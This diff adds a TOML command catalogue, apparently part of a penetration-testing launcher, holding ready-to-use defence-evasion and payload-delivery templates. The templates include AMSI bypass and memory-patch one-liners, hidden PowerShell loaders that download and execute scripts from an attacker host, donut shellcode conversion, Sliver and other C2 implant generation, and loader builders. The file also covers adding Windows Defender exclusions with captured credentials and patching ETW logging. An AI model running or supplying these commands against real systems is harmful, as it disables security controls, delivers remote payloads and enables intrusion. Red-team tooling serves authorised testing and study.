@@ -1,0 +1,179 @@
+category = "obfuscation"
+display_name = "Obfuscation"
+icon = ""
+order = 97
+
+# === PowerShell ===
+
+[[command]]
+id = "obf.ps.encode_ps_b64"
+title = "Encode current ps_rev as base64 (UTF-16LE)"
+template = "${fn:ps_rev_b64({lhost}, {lport})}"
+tags = ["powershell", "b64"]
+when = "target.has_lhost"
+
+[[command]]
+id = "obf.ps.amsi_bypass_basic"
+title = "AMSI bypass (basic, often signature-flagged)"
+template = "powershell -nop -c \"[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\""
+tags = ["amsi", "evasion"]
+
+[[command]]
+id = "obf.ps.amsi_patch_mem"
+title = "AMSI memory patch one-liner"
+template = "powershell -nop -ep bypass -c \"$a=[Ref].Assembly.GetTypes();foreach($i in $a){if($i.Name -like '*siUtils'){$p=$i}};$p.GetFields('NonPublic,Static') | %{if($_.Name -like '*Failed'){$_.SetValue($null,$true)}}\""
+tags = ["amsi", "evasion"]
+
+[[command]]
+id = "obf.ps.exec_policy_bypass"
+title = "Execution-policy bypass invocation"
+template = "powershell -ExecutionPolicy Bypass -NoProfile -File payload.ps1"
+tags = ["powershell", "execpolicy"]
+
+[[command]]
+id = "obf.ps.iex_downloadstring"
+title = "IEX DownloadString (no disk)"
+template = "powershell -nop -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://{lhost}/payload.ps1')\""
+tags = ["powershell", "loader"]
+when = "target.has_lhost"
+
+[[command]]
+id = "obf.ps.iwr_runspace"
+title = "Invoke-WebRequest in hidden runspace"
+template = "powershell -nop -w hidden -c \"[ScriptBlock]::Create((iwr -UseB http://{lhost}/payload.ps1)).Invoke()\""
+tags = ["powershell", "loader"]
+when = "target.has_lhost"
+
+[[command]]
+id = "obf.ps.invoke_obfuscation"
+title = "Invoke-Obfuscation interactive (build heavy obfuscated payload)"
+template = "pwsh -nop -c \"Import-Module ./Invoke-Obfuscation.psd1; Invoke-Obfuscation\""
+requires = ["pwsh"]
+tags = ["powershell", "obfuscation"]
+interactive = true
+
+# === .NET / Donut / Shellcode ===
+
+[[command]]
+id = "obf.donut"
+title = "donut — convert .NET assembly to shellcode"
+template = "donut -a 2 -o payload.bin -f 1 implant.exe"
+requires = ["donut"]
+tags = ["dotnet", "shellcode"]
+
+[[command]]
+id = "obf.donut.url"
+title = "donut from URL with bypass=2"
+template = "donut -u http://{lhost}/implant.exe -b 2 -o payload.bin"
+requires = ["donut"]
+tags = ["dotnet", "shellcode"]
+when = "target.has_lhost"
+
+[[command]]
+id = "obf.scarecrow"
+title = "ScareCrow loader builder"
+template = "ScareCrow -I implant.bin -Loader binary -Domain corp.local"
+requires = ["ScareCrow"]
+tags = ["loader", "evasion"]
+
+[[command]]
+id = "obf.sliver.generate"
+title = "Sliver implant generate (mTLS)"
+template = "sliver-client << 'EOF'\ngenerate --mtls {lhost}:8443 --os windows --arch amd64 --save .\nEOF"
+requires = ["sliver-client"]
+tags = ["c2", "implant"]
+when = "target.has_lhost"
+
+[[command]]
+id = "obf.havoc.gen"
+title = "Havoc — agent profile reminder"
+template = "echo 'In Havoc client: Payload -> Generate Demon EXE/DLL/Shellcode with sleep-mask + jitter'"
+tags = ["c2", "implant"]
+
+[[command]]
+id = "obf.mythic.list_payloads"
+title = "Mythic — list payload types"
+template = "mythic-cli payload list"
+requires = ["mythic-cli"]
+tags = ["c2"]
+
+# === Binary obfuscation ===
+
+[[command]]
+id = "obf.confuserex"
+title = "ConfuserEx2 — .NET protector (run on Windows)"
+template = "echo 'Windows side: ConfuserEx.exe -p preset.crproj implant.exe'"
+tags = ["dotnet", "protector"]
+
+[[command]]
+id = "obf.pe.shellter"
+title = "Shellter — PE injector (interactive)"
+template = "shellter"
+requires = ["shellter"]
+tags = ["pe", "injector"]
+interactive = true
+
+[[command]]
+id = "obf.veil.evasion"
+title = "Veil-Evasion — interactive payload gen"
+template = "veil"
+requires = ["veil"]
+tags = ["pe", "loader"]
+interactive = true
+
+# === Encoding tricks ===
+
+[[command]]
+id = "obf.b64.utf16le_for_ps"
+title = "base64-encode UTF-16LE (powershell -enc)"
+template = "echo -n 'PAYLOAD' | iconv -t UTF-16LE | base64 -w0"
+requires = ["iconv", "base64"]
+tags = ["encode"]
+
+[[command]]
+id = "obf.b64.url_safe"
+title = "URL-safe base64"
+template = "echo -n 'PAYLOAD' | base64 | tr '+/' '-_' | tr -d '='"
+requires = ["base64"]
+tags = ["encode", "url"]
+
+[[command]]
+id = "obf.cyberchef.serve"
+title = "Local CyberChef (Docker)"
+template = "docker run -d -p 8080:80 mpepping/cyberchef"
+requires = ["docker"]
+tags = ["tooling"]
+
+# === Defender / Antivirus ===
+
+[[command]]
+id = "obf.defender.check_status"
+title = "Defender status (remote, requires admin)"
+template = "nxc winrm {target} {nxc_auth} -x 'Get-MpComputerStatus | fl AMServiceEnabled,AntispywareEnabled,AntivirusEnabled,RealTimeProtectionEnabled,TamperProtectionEnabled'"
+requires = ["nxc"]
+tags = ["defender", "recon"]
+when = "creds.kind in ['plaintext','ntlm']"
+
+[[command]]
+id = "obf.defender.exclusions"
+title = "Defender exclusions enum"
+template = "nxc winrm {target} {nxc_auth} -x 'Get-MpPreference | fl ExclusionPath,ExclusionProcess,ExclusionExtension'"
+requires = ["nxc"]
+tags = ["defender", "recon"]
+when = "creds.kind in ['plaintext','ntlm']"
+
+[[command]]
+id = "obf.defender.add_exclusion"
+title = "Defender: add path exclusion (need local admin)"
+template = "nxc winrm {target} {nxc_auth} -x 'Add-MpPreference -ExclusionPath \"C:\\Temp\"'"
+requires = ["nxc"]
+tags = ["defender", "evasion"]
+when = "creds.kind in ['plaintext','ntlm']"
+
+# === ETW / event logging ===
+
+[[command]]
+id = "obf.etw.disable_basic"
+title = "Disable ETW (Patch ntdll EtwEventWrite)"
+template = "echo 'Use SilentETW / SharpSploit; powershell example: [Reflection.Assembly]::Load([Convert]::FromBase64String($etwPatch)) | Out-Null'"
+tags = ["etw", "evasion"]
